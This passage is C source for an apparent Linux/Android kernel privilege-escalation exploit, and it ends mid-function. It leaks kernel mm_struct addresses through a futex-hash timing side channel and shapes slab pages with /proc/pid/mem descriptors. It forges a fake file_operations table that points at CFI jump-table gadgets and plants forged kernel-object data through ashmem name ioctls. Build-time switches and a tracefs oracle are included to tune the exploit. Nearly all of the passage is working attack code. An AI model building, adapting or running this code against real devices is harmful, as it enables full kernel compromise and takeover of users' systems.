      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
               "Seccomp_filters=%s", values[0], values[1], values[2]);
    }
  }
  const char *stack_writer = "pselect";
  const char *reclaim = "legacy";
  const char *fops_route = "bank";
  const char *pipe_order = "before-fops";
#if defined(SLIDE_STACK_WRITER) && \
    defined(SLIDE_STACK_WRITER_MCAST) && \
    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
  stack_writer = "mcast";
#elif defined(SLIDE_STACK_WRITER) && \
      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
  stack_writer = "sigreturn";
#endif
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
  reclaim = "controlled";
#endif
#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE
  fops_route = "direct";
#endif
#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
  pipe_order = "after-fops";
#endif
  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
             enforce);
  pr_success("startup limits pid=%d %s\n", getpid(), limits);
  pr_success("build config pid=%d label=%s stack_writer=%s reclaim=%s fops=%s pipe=%s\n",
             getpid(), BUILD_VARIANT_LABEL, stack_writer, reclaim,
             fops_route, pipe_order);
  pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
             "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
             "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
             getpid(), (unsigned long long)P0_PHYS_OFFSET,
             (unsigned long long)P0_KERNEL_PHYS_LOAD,
             (unsigned long long)P0_KERNEL_PHYS_DELTA,
             (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
             (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
             (unsigned long long)SLIDE_INIT_TASK,
             (unsigned long long)SLIDE_ROOT_TASK_GROUP,
             (unsigned long long)SLIDE_SYSCTL_BOOTID);
}

void disable_rseq_for_thread(void) {
  return;
}

long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = SCHED_BATCH;
  attr.sched_nice = nice_value;
  return syscall(SYS_sched_setattr, tid, &attr, 0);
}

int try_cache_ashmem_path(const char *path) {
  int fd = open(path, O_RDWR | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }

  close(fd);
  snprintf(ashmem_path, sizeof(ashmem_path), "%s", path);
  return 1;
}

int same_rdev_path(const char *path, dev_t rdev) {
  struct stat st;
  if (stat(path, &st) != 0) {
    return 0;
  }
  return S_ISCHR(st.st_mode) && st.st_rdev == rdev;
}

void init_ashmem_path(void) {
  char boot_id[128];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, boot_id, sizeof(boot_id) - 1);
    close(fd);
    if (n > 0) {
      boot_id[n] = 0;
      boot_id[strcspn(boot_id, "\r\n")] = 0;

      char path[256];
      snprintf(path, sizeof(path), "/dev/ashmem%s", boot_id);
      if (try_cache_ashmem_path(path)) {
        return;
      }
    }
  }

  struct stat base;
  int have_base = stat("/dev/ashmem", &base) == 0;
  have_base = have_base && S_ISCHR(base.st_mode);
  DIR *dir = opendir("/dev");
  if (dir && have_base) {
    struct dirent *de;
    while ((de = readdir(dir)) != NULL) {
      if (strncmp(de->d_name, "ashmem", 6) != 0 ||
          strcmp(de->d_name, "ashmem") == 0) {
        continue;
      }

      char path[256];
      snprintf(path, sizeof(path), "/dev/%s", de->d_name);
      if (same_rdev_path(path, base.st_rdev) &&
          try_cache_ashmem_path(path)) {
        closedir(dir);
        return;
      }
    }
  }
  if (dir) {
    closedir(dir);
  }
}

int open_ashmem_device(void) {
  return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
}

uintptr_t p0_data_alias(uintptr_t image_addr) {
  uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
  uintptr_t phys = P0_KERNEL_PHYS_LOAD + off;
  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
}

uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
  return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
}

uintptr_t data_direct_addr(uintptr_t image_addr) {
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  uintptr_t address = p0_data_alias(image_addr);
  return data_alias_uses_slide ? address + slide_p0_offset : address;
#else
  return p0_data_alias(image_addr) + slide_p0_offset;
#endif
}

uintptr_t data_addr(uintptr_t image_addr) {
  return data_addr_canonical ? text_addr(image_addr)
                             : data_direct_addr(image_addr);
}

uintptr_t kaslr_image_addr(uintptr_t image_addr) {
  if (!kaslr_done) {
    return image_addr;
  }
  return kaslr_base + (image_addr - KIMAGE_TEXT_BASE);
}

uintptr_t text_addr(uintptr_t image_addr) {
  return kaslr_image_addr(image_addr);
}

uintptr_t slide_canon_addr(uintptr_t data_alias) {
  return kaslr_base + p0_alias_image_offset(data_alias);
}

uintptr_t canon_addr(uintptr_t image_addr) {
  return text_addr(image_addr);
}

void put64(unsigned char *p, size_t off, uint64_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put32(unsigned char *p, size_t off, uint32_t value) {
  memcpy(p + off, &value, sizeof(value));
}

void put_fake_fops_table(unsigned char *p, size_t off) {
  put64(p, off + FOPS_OWNER_OFF, 0);
  put64(p, off + FOPS_LLSEEK_OFF,
        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
  put64(p, off + FOPS_READ_OFF, 0);
  put64(p, off + FOPS_WRITE_OFF, 0);
  put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER_CFI_JT));
  put64(p, off + FOPS_WRITE_ITER_OFF,
        text_addr(CONFIGFS_BIN_WRITE_ITER_CFI_JT));
  put64(p, off + FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL_CFI_JT));
  put64(p, off + FOPS_COMPAT_IOCTL_OFF,
        text_addr(ASHMEM_COMPAT_IOCTL_CFI_JT));
  put64(p, off + FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP_CFI_JT));
  put64(p, off + FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN_CFI_JT));
  put64(p, off + FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE_CFI_JT));
  put64(p, off + FOPS_SPLICE_READ_OFF,
        text_addr(COPY_SPLICE_READ_CFI_JT));
  put64(p, off + FOPS_SHOW_FDINFO_OFF,
        text_addr(ASHMEM_SHOW_FDINFO_CFI_JT));
}

int try_put_blob_no_zeros(int fd, const unsigned char *blob, size_t len) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

#if defined(ASHMEM_RAW_NAME_BLOB) && ASHMEM_RAW_NAME_BLOB
  /* Some kernels copy the full fixed-size buffer with no NUL handling;
   * writing the blob verbatim keeps the zeroed configfs_buffer fields
   * (needs_read_fill etc.) exactly as forged. */
  memcpy(name, blob, len);
  name[len] = 0;
#else
  for (size_t i = 0; i < len; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
  name[len] = 0;
#endif
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_put_blob_zero_at(int fd, const unsigned char *blob, size_t pos) {
  char name[ASHMEM_NAME_LEN];
  memset(name, 0x41, sizeof(name));

#if defined(ASHMEM_RAW_NAME_BLOB) && ASHMEM_RAW_NAME_BLOB
  memcpy(name, blob, pos);
#else
  for (size_t i = 0; i < pos; i++) {
    name[i] = blob[i] ? blob[i] : 1;
  }
#endif
  name[pos] = 0;
  return ioctl(fd, ASHMEM_SET_NAME, name);
}

int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
  if (try_put_blob_no_zeros(fd, blob, len) != 0) {
    return -1;
  }

  for (size_t i = len; i > 0; i--) {
    if (blob[i - 1] == 0 &&
        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
      return -1;
    }
  }
  return 0;
}

pid_t clone_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(0);
    }
    pin_to_core(CORE);
    for (;;) {
      pause();
    }
  }
  return child;
}

pid_t clone_leak_child(void) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(1);
    }
    kernelsnitch_find_collisions(ks);
    exit(0);
  }
  return child;
}

int open_memfd(pid_t child) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/%d/mem", child);
  return SYSCHK(open(path, O_RDONLY));
}

void kill_child(pid_t child) {
  if (child <= 0) {
    return;
  }
  SYSCHK(kill(child, SIGKILL));
  SYSCHK(waitpid(child, NULL, 0));
}

void close_reclaim_sockets(void) {
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
  for (size_t pair = 0; pair < controlled_reclaim_count; ++pair) {
    for (size_t side = 0; side < 2; ++side) {
      if (controlled_reclaim_sv[pair][side] >= 0) {
        close(controlled_reclaim_sv[pair][side]);
        controlled_reclaim_sv[pair][side] = -1;
      }
    }
  }
  controlled_reclaim_count = 0;
#endif
  for (int i = 0; i < 2; i++) {
    if (reclaim_sv[i] >= 0) {
      close(reclaim_sv[i]);
      reclaim_sv[i] = -1;
    }
  }
}

int reclaim_receiver_fd(void) {
  return reclaim_sv[1];
}

void close_ctx_memfds(struct mm_ctx *ctx) {
  for (size_t i = 0; i < ctx->mm_cnt; i++) {
    if (ctx->memfds[i] > 0) {
      close(ctx->memfds[i]);
      ctx->memfds[i] = -1;
    }
  }
}

void free_ctx_storage(struct mm_ctx *ctx) {
  free(ctx->childs);
  free(ctx->memfds);
  ctx->childs = NULL;
  ctx->memfds = NULL;
  ctx->mm_cnt = 0;
}

void cleanup_page_prepare_state(void) {
  close_ctx_memfds(&prepare_ctx);
  close_ctx_memfds(&spray_ctx);
  close_ctx_memfds(&pre_ctx);
  close_ctx_memfds(&post_ctx);
  if (memfd_leak > 0) {
    close(memfd_leak);
    memfd_leak = -1;
  }
  free_ctx_storage(&prepare_ctx);
  free_ctx_storage(&spray_ctx);
  free_ctx_storage(&pre_ctx);
  free_ctx_storage(&post_ctx);
  free(skb_buf);
  skb_buf = NULL;
}

int clone_memfd(void) {
  pid_t child = clone_child();
  int fd = open_memfd(child);
  kill_child(child);
  return fd;
}

#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
enum controlled_mm_zone {
  CONTROLLED_MM_INVALID,
  CONTROLLED_MM_DMA32,
  CONTROLLED_MM_NORMAL,
};

static pid_t clone_controlled_leak_child(
    struct kernelsnitch_shared_state *state) {
  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
  if (child == 0) {
    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
    if (getppid() == 1) {
      _exit(2);
    }
    kernelsnitch_find_collisions(state);
    _exit(kernelsnitch_found_collisions(state) ? 0 : 4);
  }
  return child;
}

static enum controlled_mm_zone controlled_mm_zone_of(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);

  if (base >= MM_DMA32_ALIAS_START && base < MM_DMA32_ALIAS_END) {
    return CONTROLLED_MM_DMA32;
  }
  if (base >= MM_NORMAL_ALIAS_START && base < MM_NORMAL_ALIAS_END) {
    return CONTROLLED_MM_NORMAL;
  }
  return CONTROLLED_MM_INVALID;
}

static const char *controlled_mm_zone_name(enum controlled_mm_zone zone) {
  if (zone == CONTROLLED_MM_DMA32) {
    return "dma32";
  }
  if (zone == CONTROLLED_MM_NORMAL) {
    return "normal";
  }
  return "invalid";
}

static int controlled_mm_valid(uintptr_t mm) {
  uintptr_t base = mm & ~(ORDER3_SIZE - 1);
  uintptr_t offset = mm - base;

  return controlled_mm_zone_of(mm) != CONTROLLED_MM_INVALID &&
         offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0;
}

static uintptr_t controlled_mm_match_page(
    const struct kernelsnitch_shared_state *state, uintptr_t base) {
  uintptr_t found = (uintptr_t)-1;
  size_t count = 0;

  for (uintptr_t candidate = base; candidate < base + ORDER3_SIZE;
       candidate += MM_STRUCT_SZ) {
    size_t hash = futex_hash(state->futex_addrs[0], candidate);
    size_t matches = 1;

    for (size_t i = 1; i < state->collisions; ++i) {
      matches += hash == futex_hash(state->futex_addrs[i], candidate);
    }
    if (matches == state->collisions) {
      found = candidate;
      count++;
    }
  }
  return count == 1 ? found : (uintptr_t)-1;
}

#if defined(QEMU_MM_TRACE_ORACLE) || defined(QEMU_MM_TRACE_VALIDATE)
static int qemu_mm_trace_fd = -1;

static int qemu_mm_trace_ready(void) {
  if (qemu_mm_trace_fd >= 0) {
    return 1;
  }
  const char *value = getenv("QEMU_MM_TRACE_FD");
  char *end = NULL;
  long parsed;

  if (!value || !*value) {
    pr_error("qemu mm trace fd missing\n");
    return 0;
  }
  errno = 0;
  parsed = strtol(value, &end, 10);
  if (errno || end == value || *end || parsed < 0 ||
      fcntl((int)parsed, F_GETFD) < 0) {
    pr_error("qemu mm trace fd invalid value=%s errno=%d\n", value, errno);
    return 0;
  }
  qemu_mm_trace_fd = (int)parsed;
  return 1;
}

static int qemu_mm_trace_drain(void) {
  char data[16384];

  if (!qemu_mm_trace_ready()) {
    return 0;
  }
  for (;;) {
    ssize_t size = read(qemu_mm_trace_fd, data, sizeof(data));
    if (size > 0) {
      continue;
    }
    if (size < 0 && errno != EAGAIN && errno != EINTR) {
      pr_error("qemu mm trace drain errno=%d\n", errno);
      return 0;
    }
    return 1;
  }
}

static int qemu_mm_trace_read(uintptr_t *mm_out) {
  char data[16384];
  char pid_token[32];

  snprintf(pid_token, sizeof(pid_token), "-%d ", getpid());
  for (size_t retry = 0; retry < 200; ++retry) {
    ssize_t size = read(qemu_mm_trace_fd, data, sizeof(data) - 1);
    if (size < 0) {
      if (errno == EAGAIN || errno == EINTR) {
        usleep(1000);
        continue;
      }
      pr_error("qemu mm trace read errno=%d\n", errno);
      return 0;
    }
    if (!size) {
      usleep(1000);
      continue;
    }
    data[size] = 0;
    char *line = data;
    while (line && *line) {
      char *next = strchr(line, '\n');
      if (next) {
        *next++ = 0;
      }
      char *event = strstr(line, "kmem_cache_alloc:");
      char *ptr = event ? strstr(event, " ptr=") : NULL;
      int mm_callsite = event &&
          (strstr(event, "call_site=copy_mm+") ||
           strstr(event, "call_site=mm_alloc+"));
      if (mm_callsite && ptr && strstr(line, pid_token)) {
        unsigned long long parsed = 0;
        if (sscanf(ptr, " ptr=%llx", &parsed) == 1 && parsed) {
          *mm_out = (uintptr_t)parsed;
          return 1;
        }
      }
      line = next;
    }
  }
  pr_error("qemu mm trace missed pid=%d\n", getpid());
  return 0;
}
#endif

static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
                              uintptr_t *mm_out, int *hint_hit) {
#ifdef QEMU_MM_TRACE_ORACLE
  pid_t child;
  int fd;

  (void)cpu_count;
  if (!qemu_mm_trace_drain()) {
    return -1;
  }

  child = clone_child();
  fd = open_memfd(child);
  kill_child(child);
  if (qemu_mm_trace_read(mm_out)) {
    *hint_hit = hint && ((*mm_out & ~(ORDER3_SIZE - 1)) == hint);
    pr_info("qemu mm oracle pid=%d mm=%016zx hint=%d\n",
            getpid(), *mm_out, *hint_hit);
    return fd;
  }
  close(fd);
  return -2;
#else
  uintptr_t current_hint = hint;
  size_t collisions = hint ? S918_KSNITCH_HINT_COLLISIONS
                           : S918_KSNITCH_FULL_COLLISIONS;
  size_t passes = hint ? 2 : 1;

  *hint_hit = 0;
  for (size_t pass = 0; pass < passes; ++pass) {
    struct kernelsnitch_shared_state *state = kernelsnitch_setup(
        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
    pid_t child;
    int fd;
    int status;

    if (!state) {
      return -1;
    }
    kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
#ifdef QEMU_MM_TRACE_VALIDATE
    uintptr_t oracle_mm = 0;
    if (!qemu_mm_trace_drain()) {
      state->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(state);
      return -1;
    }
#endif
    child = clone_controlled_leak_child(state);
    fd = open_memfd(child);
    int child_ok = waitpid(child, &status, 0) == child && WIFEXITED(status) &&
                   !WEXITSTATUS(status) &&
                   kernelsnitch_found_collisions(state);
#ifdef QEMU_MM_TRACE_VALIDATE
    int oracle_ok = qemu_mm_trace_read(&oracle_mm);
    if (!child_ok) {
      pr_info("qemu mm validate collision=0 actual=%016zx trace=%d\n",
              oracle_mm, oracle_ok);
    }
#endif
    if (!child_ok) {
      close(fd);
      state->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(state);
      if (current_hint) {
        current_hint = 0;
        collisions = S918_KSNITCH_FULL_COLLISIONS;
        continue;
      }
      return -2;
    }
    if (current_hint) {
      state->mm_struct = controlled_mm_match_page(state, current_hint);
      if (state->mm_struct == (uintptr_t)-1) {
        close(fd);
        state->state = KERNELSNITCH_MM_NOT_FOUND;
        kernelsnitch_cleanup(state);
        current_hint = 0;
        collisions = S918_KSNITCH_FULL_COLLISIONS;
        continue;
      }
      state->found = 1;
      state->state = KERNELSNITCH_MM_FOUND;
      *hint_hit = 1;
    } else {
      kernelsnitch_bruteforce(state);
    }
    if (state->mm_struct == (uintptr_t)-1) {
      close(fd);
      kernelsnitch_cleanup(state);
      return -2;
    }
    *mm_out = state->mm_struct;
#ifdef QEMU_MM_TRACE_VALIDATE
    pr_info("qemu mm validate ks=%016zx actual=%016zx exact=%d page=%d "
            "hint=%d\n",
            *mm_out, oracle_mm, oracle_ok && *mm_out == oracle_mm,
            oracle_ok && ((*mm_out & ~(ORDER3_SIZE - 1)) ==
                          (oracle_mm & ~(ORDER3_SIZE - 1))),
            *hint_hit);
    if (!oracle_ok || *mm_out != oracle_mm) {
      close(fd);
      state->state = KERNELSNITCH_MM_NOT_FOUND;
      kernelsnitch_cleanup(state);
      return -2;
    }
#endif
    kernelsnitch_cleanup(state);
    return fd;
  }
  return -2;
#endif
}

static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
                                       int *chosen_fds) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t max_groups = 64;
  const size_t opaque_capacity = S918_PAGE_SCAN_MAX * batch;
  uintptr_t *bases = calloc(max_groups, sizeof(*bases));
  size_t *counts = calloc(max_groups, sizeof(*counts));
  int *fds = malloc(max_groups * batch * sizeof(*fds));
  unsigned char *seen = calloc(max_groups * batch, sizeof(*seen));
  int *opaque = malloc(opaque_capacity * sizeof(*opaque));
  size_t opaque_count = 0;
  size_t group_count = 0;
  size_t chosen = max_groups;
  uintptr_t hint = 0;
  unsigned long chosen_attempt = 0;
  int result = 0;

  if (!bases || !counts || !fds || !seen || !opaque) {
    SYSCHK(-1);
  }
  for (size_t i = 0; i < max_groups * batch; ++i) {
    fds[i] = -1;
  }
  for (size_t i = 0; i < batch; ++i) {
    chosen_fds[i] = -1;
  }
  pr_info("controlled mm group search scans=%d objects=%zu dma32_skip=%d\n",
          S918_PAGE_SCAN_MAX, batch, S918_DMA32_SKIP_SLABS);

  for (unsigned long attempt = 1;
       attempt <= S918_PAGE_SCAN_MAX && !result; ++attempt) {
    uintptr_t mm = 0;
    uintptr_t base;
    size_t slot;
    size_t group = max_groups;
    int hint_hit;
    int fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);

    if (fd == -2) {
      continue;
    }
    if (fd < 0) {
      break;
    }
    if (!controlled_mm_valid(mm)) {
      SYSCHK(close(fd));
      continue;
    }
    base = mm & ~(ORDER3_SIZE - 1);
    slot = (mm - base) / MM_STRUCT_SZ;
    if (controlled_mm_zone_of(base) == CONTROLLED_MM_DMA32) {
      size_t refs = S918_DMA32_SKIP_SLABS * batch;

      if (opaque_count + refs > opaque_capacity) {
        SYSCHK(close(fd));
        break;
      }
      opaque[opaque_count++] = fd;
      pin_to_core(CORE);
      for (size_t i = 1; i < refs; ++i) {
        opaque[opaque_count++] = clone_memfd();
      }
      pr_info("controlled mm dma32 skip attempt=%lu base=%016zx refs=%zu total=%zu\n",
              attempt, base, refs, opaque_count);
      hint = 0;
      continue;
    }
    hint = base;
    for (size_t i = 0; i < group_count; ++i) {
      if (bases[i] == base) {
        group = i;
        break;
      }
    }
    if (group == max_groups && group_count < max_groups) {
      group = group_count++;
      bases[group] = base;
      pr_info("controlled mm group opened attempt=%lu group=%zu "
              "base=%016zx hint=%d\n",
              attempt, group, base, hint_hit);
    }
    if (group == max_groups || slot >= batch) {
      SYSCHK(close(fd));
      continue;
    }
    if (seen[group * batch + slot]) {
      SYSCHK(close(fd));
      hint = base;
      pr_info("controlled mm duplicate rejected attempt=%lu group=%zu "
              "base=%016zx slot=%zu\n",
              attempt, group, base, slot);
      continue;
    }
    seen[group * batch + slot] = 1;
    fds[group * batch + slot] = fd;
    counts[group]++;
    if (counts[group] == 1 || counts[group] % 8 == 0 ||
        counts[group] + 1 >= batch) {
      pr_info("controlled mm group attempt=%lu group=%zu base=%016zx slot=%zu count=%zu hint=%d\n",
              attempt, group, base, slot, counts[group], hint_hit);
    }
    if (counts[group] == batch) {
      chosen = group;
      chosen_attempt = attempt;
      *base_out = base;
      result = 1;
    }
  }

  pin_to_core(CORE);
  for (size_t group = 0; group < group_count; ++group) {
    for (size_t slot = 0; slot < batch; ++slot) {
      int fd = fds[group * batch + slot];

      if (fd < 0) {
        continue;
      }
      if (result && group == chosen) {
        chosen_fds[slot] = fd;
        continue;
      }
      SYSCHK(close(fd));
    }
  }
  for (size_t i = 0; i < opaque_count; ++i) {
    SYSCHK(close(opaque[i]));
  }
  if (result) {
    pr_info("controlled mm group full group=%zu base=%016zx attempts=%lu zone=%s\n",
            chosen, *base_out, chosen_attempt,
            controlled_mm_zone_name(controlled_mm_zone_of(*base_out)));
  } else {
    pr_warning("controlled mm group failed groups=%zu scans=%d\n",
               group_count, S918_PAGE_SCAN_MAX);
  }
  free(opaque);
  free(seen);
  free(fds);
  free(counts);
  free(bases);
  return result;
}

struct controlled_mm_drain_state {
  int *triggers;
  size_t trigger_count;
  int s2;
};

static void release_controlled_mm_drain(
    struct controlled_mm_drain_state *state) {
  size_t closed = 0;

  pin_to_core(CORE);
  for (size_t i = 0; i < state->trigger_count; ++i) {
    if (state->triggers[i] < 0) {
      continue;
    }
    SYSCHK(close(state->triggers[i]));
    state->triggers[i] = -1;
    closed++;
  }
  if (state->s2 >= 0) {
    SYSCHK(close(state->s2));
    state->s2 = -1;
    closed++;
  }
  free(state->triggers);
  state->triggers = NULL;
  state->trigger_count = 0;
  pr_info("controlled mm trigger release closed=%zu cpu=%d\n",
          closed, sched_getcpu());
}

static int drain_controlled_mm_group(
    int *target_fds, struct controlled_mm_drain_state *state,
    int shaping_sv[2]) {
  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
  const size_t trigger_refs = S918_TRIGGER_SLABS * batch;

  state->triggers = malloc(trigger_refs * sizeof(*state->triggers));
  state->trigger_count = trigger_refs;
  state->s2 = -1;
  if (!state->triggers) {
    errno = ENOMEM;
    SYSCHK(-1);
  }
  pin_to_core(CORE);
  for (size_t i = 0; i < trigger_refs; ++i) {
    state->triggers[i] = clone_memfd();
  }
  state->s2 = clone_memfd();
  pr_info("controlled mm trigger ready pages=%d refs=%zu s2=%d cpu=%d\n",
          S918_TRIGGER_SLABS, trigger_refs, state->s2, sched_getcpu());
  for (size_t i = 0; i + 1 < batch; ++i) {
    SYSCHK(close(target_fds[i]));
    target_fds[i] = -1;
  }
  for (size_t page = 0; page < S918_TRIGGER_SLABS; ++page) {
    size_t index = page * batch;
    SYSCHK(close(state->triggers[index]));
    state->triggers[index] = -1;
  }
  pr_info("controlled mm target tail armed pages=%d refs_held=%zu shape=ready cpu=%d\n",
          S918_TRIGGER_SLABS,
          trigger_refs - S918_TRIGGER_SLABS + 1, sched_getcpu());
  SYSCHK(fflush(NULL));
  SYSCHK(close(shaping_sv[0]));
  shaping_sv[0] = -1;
  SYSCHK(close(shaping_sv[1]));
  shaping_sv[1] = -1;
  sched_yield();
  sched_yield();
  sched_yield();
  sched_yield();
  SYSCHK(close(target_fds[batch - 1]));
  target_fds[batch - 1] = -1;
  return 1;
}

#if defined(APP_RECLAIM_TRACEFS_GATE) && APP_RECLAIM_TRACEFS_GATE
struct reclaim_tracefs_gate {
  int enabled;
  unsigned long long pfn;
};

static int reclaim_tracefs_write(const char *path, const char *text) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("reclaim tracefs open failed path=%s errno=%d\n", path,
               errno);
    return 0;
  }
  size_t size = strlen(text);
  ssize_t wrote = write(fd, text, size);
  int saved_errno = errno;
  if (close(fd) != 0) {
    pr_warning("reclaim tracefs close failed path=%s errno=%d\n", path,
               errno);
    return 0;
  }
  if (wrote != (ssize_t)size) {
    pr_warning("reclaim tracefs write failed path=%s wrote=%zd size=%zu errno=%d\n",
               path, wrote, size, saved_errno);
    return 0;
  }
  return 1;
}

static int reclaim_tracefs_stop(void) {
  int ok = 1;
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/tracing_on", "0");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_alloc/enable", "0");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_free/enable", "0");
  return ok;
}

static int reclaim_tracefs_start(uintptr_t base,
                                 struct reclaim_tracefs_gate *gate) {
  memset(gate, 0, sizeof(*gate));
  if (base < P0_PAGE_OFFSET) {
    pr_warning("reclaim tracefs bad base=%016zx page_offset=%016llx\n",
               base, (unsigned long long)P0_PAGE_OFFSET);
    return 0;
  }
  unsigned long long phys =
      (unsigned long long)(base - P0_PAGE_OFFSET) + P0_PHYS_OFFSET;
  gate->pfn = phys >> PAGE_SHIFT;
  char filter[96];
  int filter_size = snprintf(filter, sizeof(filter),
                             "order == 3 && common_pid == %d", getpid());
  if (filter_size < 0 || (size_t)filter_size >= sizeof(filter)) {
    pr_warning("reclaim tracefs filter build failed pid=%d\n", getpid());
    return 0;
  }
  int ok = 1;
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/tracing_on", "0");
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/events/enable", "0");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_alloc/filter", filter);
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_free/filter", filter);
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/trace", "\n");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_alloc/enable", "1");
  ok &= reclaim_tracefs_write(
      "/sys/kernel/tracing/events/kmem/mm_page_free/enable", "1");
  ok &= reclaim_tracefs_write("/sys/kernel/tracing/tracing_on", "1");
  if (!ok) {
    reclaim_tracefs_stop();
    pr_warning("reclaim tracefs arm failed pfn=0x%llx\n", gate->pfn);
    return 0;
  }
  gate->enabled = 1;
  pr_info("reclaim tracefs armed base=%016zx phys=%016llx pfn=0x%llx pid=%d\n",
          base, phys, gate->pfn, getpid());
  return 1;
}

static int reclaim_tracefs_finish(struct reclaim_tracefs_gate *gate) {
  if (!gate->enabled) {
    return 1;
  }
  int controls_ok = reclaim_tracefs_stop();
  FILE *fp = fopen("/sys/kernel/tracing/trace", "re");
  if (!fp) {
    pr_warning("reclaim tracefs read open failed errno=%d\n", errno);
    return 0;
  }
  char *line = NULL;
  size_t capacity = 0;
  size_t lines = 0;
  size_t order3_free = 0;
  size_t order3_alloc = 0;
  size_t exact_free = 0;
  size_t exact_alloc = 0;
  size_t exact_alloc_after_free = 0;
  size_t exact_skb_alloc_after_free = 0;
  size_t parse_fail = 0;
  int saw_exact_free = 0;
  int exact_free_cpu = -1;
  int exact_alloc_cpu = -1;
  char exact_free_line[512] = {0};
  char exact_alloc_line[512] = {0};
  while (getline(&line, &capacity, fp) >= 0) {
    const char *event = strstr(line, "mm_page_free:");
    int is_free = event != NULL;
    if (!event) {
      event = strstr(line, "mm_page_alloc:");
    }
    if (!event || !strstr(event, "order=3")) {
      continue;
    }
    lines++;
    if (is_free) {
      order3_free++;
    } else {
      order3_alloc++;
    }
    const char *pfn_text = strstr(event, "pfn=0x");
    unsigned long long pfn = 0;
    if (!pfn_text || sscanf(pfn_text, "pfn=0x%llx", &pfn) != 1) {
      parse_fail++;
      continue;
    }
    if (pfn != gate->pfn) {
      continue;
    }
    const char *cpu_text = strchr(line, '[');
    int cpu = -1;
    if (!cpu_text || sscanf(cpu_text, "[%d]", &cpu) != 1) {
      parse_fail++;
      continue;
    }
    if (is_free) {
      exact_free++;
      saw_exact_free = 1;
      exact_free_cpu = cpu;
      if (!exact_free_line[0]) {
        size_t size = strcspn(line, "\r\n");
